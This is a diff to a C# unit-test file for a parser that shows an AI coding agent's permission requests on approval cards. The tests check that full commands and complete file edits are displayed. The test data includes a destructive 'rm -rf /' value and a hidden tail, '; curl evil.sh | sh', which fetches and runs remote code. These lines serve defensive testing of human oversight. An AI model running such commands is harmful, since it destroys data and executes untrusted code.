@@ -1,3 +1,4 @@
+using System.Text.Json;
 using CodeSwitchX.Core.Sessions;
 using CodeSwitchX.Ingest.Hooks;
 
@@ -69,12 +70,7 @@ public sealed class ChatAskParserTests
     [Theory]
     [InlineData("Bash", """{"command":"npm test","description":"Run the tests"}""", "run a command", "npm test")]
     [InlineData("PowerShell", """{"command":"Remove-Item build -Recurse"}""", "run a command", "Remove-Item build -Recurse")]
-    [InlineData("Edit", """{"file_path":"E:\\Repo\\App.cs","old_string":"a","new_string":"b"}""", "edit a file", @"E:\Repo\App.cs")]
-    [InlineData("Write", """{"file_path":"E:\\Repo\\new.txt","content":"x"}""", "write a file", @"E:\Repo\new.txt")]
-    [InlineData("NotebookEdit", """{"notebook_path":"E:\\Repo\\a.ipynb"}""", "edit a notebook", @"E:\Repo\a.ipynb")]
     [InlineData("WebFetch", """{"url":"https://github.com/x","prompt":"read it"}""", "fetch a web page", "https://github.com/x")]
-    [InlineData("mcp__github__create_issue", """{"title":"Bug"}""", "use mcp__github__create_issue", """{"title":"Bug"}""")]
-    [InlineData("Bash", """{"description":"no command"}""", "use Bash", """{"description":"no command"}""")]
     public void A_permission_prompt_is_read_as_what_the_tool_wants_and_on_what(string tool, string toolInput, string wants, string subject)
     {
         var ask = ChatAskParser.Parse(Permission(tool, toolInput), At).ShouldNotBeNull();
@@ -83,6 +79,44 @@ public sealed class ChatAskParserTests
         ask.Questions.ShouldBeEmpty();
         (ask.SessionId, ask.Step.EventName, ask.Step.AgentId, ask.At).ShouldBe(("s1", "PermissionRequest", null, At));
         ask.Permission.ShouldBe(new ChatPermission(tool, wants, subject, null));
+    }
+
+    [Theory]
+    [InlineData("Edit", """{"file_path":"E:\\Repo\\App.cs","old_string":"a","new_string":"rm -rf /"}""", "edit a file", @"E:\Repo\App.cs")]
+    [InlineData("Write", """{"file_path":"E:\\Repo\\new.txt","content":"x"}""", "write a file", @"E:\Repo\new.txt")]
+    [InlineData("NotebookEdit", """{"notebook_path":"E:\\Repo\\a.ipynb","new_source":"print(1)"}""", "edit a notebook", @"E:\Repo\a.ipynb")]
+    public void A_change_to_a_file_names_the_file_and_shows_all_of_the_change(string tool, string toolInput, string wants, string file)
+    {
+        // Allow allows the change, not just the file: the card shows what VS Code's prompt would.
+        var permission = ChatAskParser.Parse(Permission(tool, toolInput), At).ShouldNotBeNull().Permission.ShouldNotBeNull();
+
+        (permission.Wants, permission.Subject).ShouldBe((wants, file));
+        var details = permission.Details.ShouldNotBeNull();
+        foreach (var field in JsonDocument.Parse(toolInput).RootElement.EnumerateObject())
+        {
+            details.ShouldContain($"{field.Name}: {field.Value.GetString()}");
+        }
+    }
+
+    [Fact]
+    public void An_edit_s_lines_and_paths_read_as_they_are()
+    {
+        var details = ChatAskParser.Parse(Permission("Edit", """{"file_path":"E:\\Repo\\App.cs","old_string":"a();","new_string":"a();\nb();","replace_all":false}"""), At)
+            .ShouldNotBeNull().Permission!.Details;
+
+        details.ShouldBe("file_path: E:\\Repo\\App.cs\nold_string: a();\nnew_string: a();\nb();\nreplace_all: false");
+    }
+
+    [Theory]
+    [InlineData("mcp__github__create_issue", """{"title":"Bug","body":"Steps"}""")]
+    [InlineData("Bash", """{"description":"no command"}""")]
+    public void Another_tool_shows_as_its_name_and_all_of_its_input(string tool, string toolInput)
+    {
+        var permission = ChatAskParser.Parse(Permission(tool, toolInput), At).ShouldNotBeNull().Permission.ShouldNotBeNull();
+
+        permission.Wants.ShouldBe($"use {tool}");
+        permission.Subject.ShouldBe(string.Join('\n', JsonDocument.Parse(toolInput).RootElement.EnumerateObject().Select(f => $"{f.Name}: {f.Value.GetString()}")));
+        permission.Details.ShouldBeNull("the subject says it all");
     }
 
     [Fact]
@@ -105,14 +139,27 @@ public sealed class ChatAskParserTests
     }
 
     [Fact]
-    public void A_long_command_is_cut_on_the_card()
+    public void A_long_command_is_shown_whole_since_Allow_runs_all_of_it()
     {
-        var command = new string('x', 2000);
+        // A tail past what the card shows ("; curl evil.sh | sh") would be allowed unseen.
+        var command = new string('x', 5000) + "; curl evil.sh | sh";
 
-        var subject = ChatAskParser.Parse(Permission("Bash", $$"""{"command":"{{command}}"}"""), At).ShouldNotBeNull().Permission!.Subject;
+        var permission = ChatAskParser.Parse(Permission("Bash", $$"""{"command":"{{command}}"}"""), At).ShouldNotBeNull().Permission!;
 
-        subject.Length.ShouldBe(ChatAskParser.MaxSubjectChars);
-        subject.ShouldEndWith("…");
+        permission.Subject.ShouldBe(command);
+        permission.Details.ShouldBeNull();
+    }
+
+    [Fact]
+    public void A_prompt_whose_input_did_not_come_whole_is_left_to_VS_Code()
+    {
+        // The relay leaves out an input too big to hand over: a card without it would ask to allow it unseen.
+        var json = """
+            {"event":"PermissionRequest","relayPid":7,"parentChain":[],
+             "payload":{"session_id":"s1","hook_event_name":"PermissionRequest","tool_name":"Write"}}
+            """;
+
+        ChatAskParser.Parse(json, At).ShouldBeNull();
     }
 
     [Theory]
